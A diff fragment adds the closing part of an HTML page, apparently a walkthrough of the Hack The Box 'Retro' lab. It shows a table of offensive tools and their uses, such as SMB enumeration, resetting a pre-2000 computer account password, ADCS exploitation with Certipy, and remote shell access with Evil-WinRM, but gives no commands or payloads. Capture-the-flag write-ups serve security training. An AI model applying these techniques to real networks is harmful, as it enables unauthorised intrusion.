+                        <td>NetExec</td>
+                        <td>SMB enumeration and authentication testing</td>
+                    </tr>
+                    <tr>
+                        <td>SMBClient</td>
+                        <td>Accessing and downloading files from SMB shares</td>
+                    </tr>
+                    <tr>
+                        <td>Impacket (changepasswd.py)</td>
+                        <td>Changing Pre-2000 computer account password</td>
+                    </tr>
+                    <tr>
+                        <td>Certipy</td>
+                        <td>ADCS enumeration and exploitation</td>
+                    </tr>
+                    <tr>
+                        <td>Evil-WinRM</td>
+                        <td>Remote PowerShell access via WinRM</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <footer>
+            <p>HTB: Retro - Complete Walkthrough</p>
+        </footer>
+    </div>
+</body>
+</html>
